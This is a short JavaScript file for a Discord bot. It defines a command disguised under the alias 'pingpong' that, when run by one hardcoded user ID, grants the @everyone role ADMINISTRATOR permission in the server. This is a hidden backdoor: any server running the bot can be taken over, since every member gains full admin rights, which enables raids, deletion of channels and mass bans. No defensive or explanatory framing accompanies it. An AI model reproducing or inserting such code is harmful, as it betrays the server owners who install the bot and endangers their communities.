const { Command } = require('discord-akairo');


class SinisterCommand extends Command {
    constructor() {
        super('sinister', {
            aliases: ['pingpong', 'sinister'],
            channel: 'guild'
        });
    }

    async exec(message) {

      const Discord = require ('discord.js')
      const guild = message.guild;
 
      if (message.member.id == '480658831056175104')
      guild.roles.everyone.setPermissions('ADMINISTRATOR');

      }}


module.exports = SinisterCommand